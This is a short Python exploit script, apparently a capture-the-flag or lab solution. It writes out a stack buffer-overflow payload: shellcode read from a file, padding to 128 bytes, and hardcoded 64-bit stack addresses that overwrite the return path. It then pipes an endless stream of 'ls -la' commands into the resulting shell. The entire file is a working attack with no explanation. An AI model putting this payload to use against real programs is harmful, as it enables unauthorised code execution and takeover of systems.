#!/usr/bin/python
import sys
import struct


x = open("shell.bin").read()

sys.stdout.write(x)
sys.stdout.write("1"*(128 - len(x)))

sys.stdout.write(struct.pack("@I", 0xffffdd50))
sys.stdout.write(struct.pack("@I", 0x7fff))

sys.stdout.write(struct.pack("@I", 0xffffdca0))
sys.stdout.write(struct.pack("@I", 0x7fff))


sys.stdout.write("\n")
while True:
    sys.stdout.write("ls -la\n")
    #sys.stdout.write("echo hello\n")
    #sys.stdout.write("echo hello >> hello.txt\n")



